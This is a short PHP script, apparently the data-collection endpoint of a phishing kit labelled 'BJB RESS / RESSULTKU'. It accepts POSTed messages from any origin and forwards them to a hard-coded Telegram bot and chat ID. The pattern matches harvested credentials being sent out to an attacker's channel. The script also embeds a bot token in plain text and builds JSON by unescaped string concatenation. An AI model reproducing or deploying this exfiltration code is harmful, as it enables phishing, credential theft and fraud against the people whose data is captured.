<?php
header('Access-Control-Allow-Origin: *');
$token = "7460549982:AAFn7Pu0P9mBpa5D8T3v9zezh6fmVVzXSu4";
$chatID = "6562479119";
$content = $_POST['message'];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$token."/sendMessage?parse_mode=html");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Content-Type: application/json"
]);
curl_setopt($ch, CURLOPT_POSTFIELDS,
            "{\"chat_id\":\"".$chatID."\",\"text\":\"━─━────༺BJB RESS༻────━─━\n\n(BJB | RESSULTKU)\n\n".$content."\"}");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$server_output = curl_exec($ch);
curl_close($ch);
echo $server_output;
